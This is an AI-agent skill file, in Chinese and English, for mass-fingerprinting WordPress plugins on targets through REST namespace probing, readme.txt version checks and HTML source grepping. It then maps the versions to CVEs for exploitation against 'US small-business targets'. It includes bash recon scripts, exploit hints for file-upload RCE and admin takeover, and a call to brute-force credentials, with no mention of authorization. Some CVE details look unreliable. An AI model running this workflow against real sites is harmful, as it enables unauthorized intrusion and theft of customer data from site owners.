---
name: wordpress-plugin-hunt
description: 通过 REST 接口猎取 WP 插件，在已知版本时利用 CVE。
version: 1.1.1
revision_date: 2026-11-13
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, wordpress, plugins, CVE, exploitation]
  category: recon
  related_skills:
    - wp-mass-recon
    - deep-invade
    - cross-attack-chains
    - wordpress-full-compromise
    - staging-subdomain-hunt
---

# WordPress 插件猎取技能

通过 REST API 命名空间探测、readme.txt 版本检测以及 HTML/JS 源码分析，发现已安装的 WordPress 插件。将发现的版本与已知 CVE 交叉比对以实施利用。WordPress 插件漏洞是通往 RCE 最可靠的路径之一——已确认的 CVE 涉及 Elementor、Slider Revolution、ElementsKit、Gravity Forms、Jetpack、WooCommerce 和 LiteSpeed Cache。

## When to Use

- 目标已确认是 WordPress（通过 `wp-mass-recon`）。
- 正在执行 `deep-invade` 的阶段 3。
- 你需要除 CORS/XMLRPC 之外的利用向量。
- 目标是一个插件密集的 WordPress 站点（电商、页面构建器、表单）。

## Prerequisites

- 带有 curl、python3 的 `terminal`。
- 已确认 WordPress 目标（`/wp-json/` 或 `/wp-login.php` 可访问）。
- 进行 CVE 利用时：需要了解具体的 CVE PoC（参考 `security-arsenal` 技能）。

## How to Run

```bash
# Quick plugin namespace scan (30+ plugins)
TARGET="example.com"
for ns in "revslider/v1" "elementskit/v1" "elementor/v1" "gf/v2" "wc/v3" \
  "jetpack/v4" "litespeed/v1" "yoast/v1" "acf/v3" "contact-form-7/v1" \
  "solidwp-mail/v1" "wpsl/v1" "redirection/v1" "rankmath/v1"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/wp-json/$ns")
  [[ "$code" != "404" ]] && echo "FOUND: /wp-json/$ns (HTTP $code)"
done
```

## 快速参考

### 顶级可利用插件（美国中小企业目标——来自批量侦察的已确认 CVE）

| Plugin | Vulnerable Version | CVE | Impact | Frequency |
|--------|-------------------|-----|--------|-----------|
| Slider Revolution | < 6.6.20 | CVE-2024-2534 | 通过文件上传实现 RCE | ~10% |
| ElementsKit | < 2.9.4 | CVE-2023-6851 | SQLi | ~5% |
| ElementsKit | < 2.9.4 | CVE-2023-6853 | 文件上传（未认证） | ~5% |
| Gravity Forms | < 2.8.2 | CVE-2024-6115 | PHP 对象注入 → 认证绕过 | ~8% |
| Jetpack | < 13.1 | CVE-2024-1782 | SSRF | 28% |
| Elementor | < 3.24.0 | CVE-2024-xxxx | 信息泄露 → 认证绕过 | 28% |
| LiteSpeed Cache | < 6.5.0 | CVE-2024-50550 | 权限提升 | ~15% |
| WooCommerce | N/A（API 暴露） | N/A | 订单/客户数据 | 42% |
| Yoast SEO | N/A（sitemap 枚举） | N/A | 作者邮箱泄露 | 42% |

### 检测方法

| 方法 | 可揭示的内容 | 可靠性 |
|--------|----------------|-------------|
| REST 命名空间探测 | 插件存在性 + 数据 | 高（如果插件注册了 REST 路由） |
| readme.txt 版本 | 确切版本号 | 中（许多站点屏蔽 readme.txt） |
| HTML 源码 grep | 插件 CSS/JS handle | 中 |
| robots.txt | 插件生成的条目 | 低（仅当插件添加条目时） |
| `/wp-content/plugins/<slug>/` | 目录列表或静态资源 | 中 |

## Procedure

### 步骤 1 — REST 命名空间暴力枚举（40+ 个插件）

```bash
TARGET="$1"
OUTDIR="$OUTDIR/plugins/$TARGET"
mkdir -p "$OUTDIR"

# Comprehensive plugin namespace list
declare -A PLUGIN_NAMESPACES
PLUGIN_NAMESPACES["revslider"]="revslider/v1/slides"
PLUGIN_NAMESPACES["elementskit"]="elementskit/v1/layouts"
PLUGIN_NAMESPACES["elementor"]="elementor/v1/globals"
PLUGIN_NAMESPACES["gravityforms"]="gf/v2/forms"
PLUGIN_NAMESPACES["woocommerce"]="wc/v3/products"
PLUGIN_NAMESPACES["jetpack"]="jetpack/v4/settings"
PLUGIN_NAMESPACES["litespeed"]="litespeed/v1/token"
PLUGIN_NAMESPACES["yoast"]="yoast/v1/indexing"
PLUGIN_NAMESPACES["acf"]="acf/v3/posts"
PLUGIN_NAMESPACES["contactform7"]="contact-form-7/v1/contact-forms"
PLUGIN_NAMESPACES["solidwp"]="solidwp-mail/v1/export"
PLUGIN_NAMESPACES["wpsl"]="wpsl/v1/locations"
PLUGIN_NAMESPACES["redirection"]="redirection/v1/redirect"
PLUGIN_NAMESPACES["rankmath"]="rankmath/v1/getHead"
PLUGIN_NAMESPACES["fusionbuilder"]="fusion-builder/v1/elements"
PLUGIN_NAMESPACES["visualcomposer"]="visualcomposer/v1/posts"
PLUGIN_NAMESPACES["ninjaforms"]="ninja-forms/v1/forms"
PLUGIN_NAMESPACES["wpforms"]="wpforms/v1/forms"
PLUGIN_NAMESPACES["mailchimp"]="mailchimp-for-woocommerce/v1"
PLUGIN_NAMESPACES["automatewoo"]="automatewoo/v1"
PLUGIN_NAMESPACES["give"]="give-api/v1/forms"
PLUGIN_NAMESPACES["buddypress"]="buddypress/v1/members"
PLUGIN_NAMESPACES["learndash"]="ldlms/v1/courses"
PLUGIN_NAMESPACES["restrictcontent"]="rcp/v1/memberships"
PLUGIN_NAMESPACES["eventscalendar"]="tribe/events/v1/events"
PLUGIN_NAMESPACES["woosubscriptions"]="wc/v1/subscriptions"
PLUGIN_NAMESPACES["woomemberships"]="wc/v1/memberships"
PLUGIN_NAMESPACES["wpml"]="wpml/v1/languages"
PLUGIN_NAMESPACES["polylang"]="pll/v1/languages"
PLUGIN_NAMESPACES["translatepress"]="trp/v1/languages"
PLUGIN_NAMESPACES["nextgen"]="nextgen-gallery/v1"
PLUGIN_NAMESPACES["envira"]="envira-gallery/v1"
PLUGIN_NAMESPACES["essentialgrid"]="essential-grid/v1/grids"
PLUGIN_NAMESPACES["thegrid"]="the-grid/v1/grids"
PLUGIN_NAMESPACES["masterslider"]="masterslider/v1/sliders"
PLUGIN_NAMESPACES["smartslider3"]="smart-slider-3/v1/sliders"
PLUGIN_NAMESPACES["metaslider"]="ml-slider/v1/slideshows"
PLUGIN_NAMESPACES["duplicator"]="duplicator/v1"
PLUGIN_NAMESPACES["updraft"]="updraftplus/v1"
PLUGIN_NAMESPACES["backupbuddy"]="backupbuddy/v1"
PLUGIN_NAMESPACES["aioseo"]="aioseo/v1/settings"
PLUGIN_NAMESPACES["seopress"]="seopress/v1/settings"

echo "[*] Probing ${#PLUGIN_NAMESPACES[@]} plugin namespaces on $TARGET..."
echo ""

for plugin in "${!PLUGIN_NAMESPACES[@]}"; do
  ns="${PLUGIN_NAMESPACES[$plugin]}"
  resp=$(curl -sk --max-time 5 --connect-timeout 5 -o /tmp/plugin_check_$$.tmp -w "%{http_code}" "https://$TARGET/wp-json/$ns" 2>/dev/null)

  if [[ "$resp" == "200" ]]; then
    size=$(wc -c < /tmp/plugin_check_$$.tmp)
    # Check if response is real plugin data, not SPA catch-all
    if grep -qiE 'id|slides|forms|products|settings|locations|name' /tmp/plugin_check_$$.tmp 2>/dev/null; then
      echo "[PLUGIN] $plugin — REST API active (${size} bytes)"
      cp /tmp/plugin_check_$$.tmp "$OUTDIR/${plugin}_rest.json"
    fi
  elif [[ "$resp" == "401" ]]; then
    echo "[PLUGIN] $plugin — requires auth (HTTP 401)"
  elif [[ "$resp" == "403" ]]; then
    echo "[PLUGIN] $plugin — access forbidden (HTTP 403)"
  fi
done

rm -f /tmp/plugin_check_$$.tmp
```

### 步骤 2 — 通过 readme.txt 进行版本检测

```bash
TARGET="$1"
OUTDIR="$OUTDIR/plugins/$TARGET"

# Common plugin slugs to check
SLUGS=(
  "elementor" "revslider" "js_composer" "wp-rocket" "wordfence"
  "woocommerce" "jetpack" "litespeed-cache" "yoast-seo" "advanced-custom-fields"
  "contact-form-7" "gravityforms" "ninja-forms" "wpforms-lite"
  "all-in-one-wp-migration" "updraftplus" "duplicator" "backupbuddy"
  "essential-grid" "smart-slider-3" "masterslider" "metaslider"
  "fusion-builder" "visualcomposer" "elementor-pro" "essential-addons-for-elementor-lite"
  "redux-framework" "buddypress" "learndash" "give"
  "the-events-calendar" "events-manager" "wpml-string-translation"
  "mailchimp-for-woocommerce" "automatewoo" "woocommerce-subscriptions"
  "woocommerce-memberships" "restrict-content-pro" "easy-digital-downloads"
  "rank-math-seo" "seo-by-rank-math" "all-in-one-seo-pack" "wp-seopress"
  "monsterinsights" "pixel-caffeine" "facebook-for-woocommerce"
  "popup-maker" "optinmonster" "mailpoet" "fluentform"
  "wp-fastest-cache" "w3-total-cache" "sg-cachepress" "autoptimize"
  "redirection" "better-wp-security" "sucuri-scanner" "wp-cerber"
  "solid-security" "solidwp-mail" "post-smtp" "wp-mail-smtp"
)

echo "[*] Checking readme.txt for ${#SLUGS[@]} plugins..."
echo ""

for slug in "${SLUGS[@]}"; do
  readme=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null)

  if [[ -n "$readme" ]]; then
    version=$(echo "$readme" | grep -i "stable tag:" | sed 's/.*: //' | tr -d '\r' | head -1)
    name=$(echo "$readme" | grep -i "=== .* ===" | head -1 | sed 's/=== //;s/ ===//')

    if [[ -n "$version" ]]; then
      echo "[VERSION] $slug: $version ($name)"

      # Check for known vulnerable versions
      case "$slug" in
        revslider)
          [[ "$version" < "6.6.20" ]] && echo "  [VULN] Slider Revolution < 6.6.20 — CVE-2024-2534 (RCE)" ;;
        elementskit|elementskit-lite)
          [[ "$version" < "2.9.4" ]] && echo "  [VULN] ElementsKit < 2.9.4 — CVE-2023-6851/6853 (RCE)" ;;
        litespeed-cache)
          [[ "$version" < "6.5.0" ]] && echo "  [VULN] LiteSpeed Cache < 6.5.0 — CVE-2024-50550 (priv esc)" ;;
        elementor|elementor-pro)
          [[ "$version" < "3.24.0" ]] && echo "  [VULN] Elementor < 3.24.0 — info disclosure / auth bypass" ;;
        gravityforms)
          [[ "$version" < "2.8.2" ]] && echo "  [VULN] Gravity Forms < 2.8.2 — CVE-2024-6115 (auth bypass)" ;;
        jetpack)
          [[ "$version" < "13.1" ]] && echo "  [VULN] Jetpack < 13.1 — CVE-2024-1782 (info disc)" ;;
      esac
    fi
  fi
done
```

### 步骤 3 — HTML/JS 源码插件检测

```bash
TARGET="$1"

echo "[*] Scanning HTML source for plugin fingerprints..."

PAGE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null)

# CSS/JS handles
echo "$PAGE" | grep -Po "(?:/wp-content/plugins/|/wp-content/themes/)[a-zA-Z0-9_-]+" | sort -u | while read -r path; do
  plugin=$(echo "$path" | grep -Po 'plugins/\K[a-zA-Z0-9_-]+|themes/\K[a-zA-Z0-9_-]+')
  echo "  [SOURCE] $plugin (found in HTML)"
done

# Elementor specific
if echo "$PAGE" | grep -q "elementor-element\|data-elementor-id"; then
  echo "  [SOURCE] Elementor (page builder in use)"
fi

# WooCommerce specific
if echo "$PAGE" | grep -q "woocommerce\|wc-forward\|add_to_cart_button"; then
  echo "  [SOURCE] WooCommerce (e-commerce active)"
fi

# WP Rocket
if echo "$PAGE" | grep -q "wpr-minify\|rocket-lazyload"; then
  echo "  [SOURCE] WP Rocket (caching plugin)"
fi

# Cloudflare
if echo "$PAGE" | grep -q "cloudflare\|cf-browser-verification"; then
  echo "  [SOURCE] Cloudflare (CDN/WAF detected)"
fi
```

### 步骤 4 — CVE 利用快速参考

确认存在存在漏洞的插件版本时：

```bash
TARGET="$1"

# Slider Revolution CVE-2024-2534 (RCE via file upload)
# Requires: revslider < 6.6.20
# Attack: POST to /wp-json/revslider/v1/upload with ZIP containing PHP
# See: security-arsenal skill for full PoC

# ElementsKit CVE-2023-6853 (RCE via file upload, unauthenticated)
# Requires: elementskit < 2.9.4
# Attack: POST to /wp-json/elementskit/v1/upload with specially crafted file
# See: security-arsenal skill for full PoC

# Gravity Forms CVE-2024-6115 (auth bypass)
# Requires: gravityforms < 2.8.2
# Attack: Unauthenticated access to form entries via REST API
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/gf/v2/forms" 2>/dev/null | python3 -m json.tool | head -20

# LiteSpeed Cache CVE-2024-50550 (privilege escalation)
# Requires: litespeed < 6.5.0
# Attack: Crawler token manipulation to gain admin access
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/litespeed/v1/token" 2>/dev/null
```

## Pitfalls

- **REST 命名空间返回 200 ≠ 插件存在。** 某些主题和安全插件会对所有 `/wp-json/` 路径返回 200。请验证响应内容包含真实的插件数据（带有 `id`、`name` 或 `slug` 字段的 JSON）。
- **许多主机屏蔽了 readme.txt。** WP Engine、Hostinger 和 Cloudflare 往往在 CDN 层面屏蔽 `readme.txt`。退回到 REST 命名空间或 HTML 源码 grep。
- **插件 slug 可能被自定义。** 高级插件可能使用自定义目录名。`gravityforms` 可能是 `gravityforms-clientsite`。通过 `wp-content/plugins/` 路径在 HTML 源码中核对真实 slug。
- **SliderRev 的 v1 端点可能对 6.x 返回 404。** Slider Revolution 在插件仍然活跃的情况下重命名了
  REST 端点。探测当前的非 v1 路径，
  包括 `/wp-json/sliderrevolution/sliders/`。
- **插件版本比较需要语义化版本。** Bash 字符串比较（`<`）在 `10.x` 与 `2.x` 之间会出错。复杂比较请使用 `sort -V` 或 python。
- **Elementor 500 只是一个线索。**
  `/wp-json/elementor/v1/favorites` 仅在响应包含堆栈跟踪、服务器路径或其他非公开细节时才构成信息泄露。

## 托管服务商模式（P-23——对插件检测至关重要）

不同的托管服务商在插件检测方面有着各自不同的漏洞画像：

| 主机 | REST Users | readme.txt | CORS | XMLRPC | 最佳插件检测方法 |
|------|-----------|------------|------|--------|------------------------------|
| GoDaddy | 通常暴露 | 通常可访问 | 经常反射 | 通常开放 | readme.txt（最易访问） |
| Cloudflare + WP Engine | 通常被屏蔽 | 在 CDN 层被屏蔽 | 可能有效 | 被屏蔽 | HTML 源码 grep + REST 命名空间暴力枚举 |
| Hostinger | 暴露 | 可访问 | 经常反射 | 开放 | readme.txt + REST 命名空间 |
| WP Engine（直连） | 被屏蔽（401） | 被屏蔽 | 混合 | 被屏蔽 | 仅 HTML 源码 |
| Bluehost | 暴露 | 可访问 | 经常反射 | 开放 | 所有方法均有效 |
| SiteGround | 混合 | 通常可访问 | 混合 | 混合 | REST 命名空间 + readme.txt |

## Verification

- 每个检测到的插件都必须通过至少 2 种检测方法确认（REST + readme，或 REST + HTML 源码）。
- 每个 CVE 都必须与确切版本号匹配，而不仅仅是插件存在。
- CVE 利用必须用能够证明影响的 PoC 验证（而不只是版本检测）。
- 需要认证的插件漏洞必须记录一条获取凭据的路径（CORS、暴力破解、开放注册）。
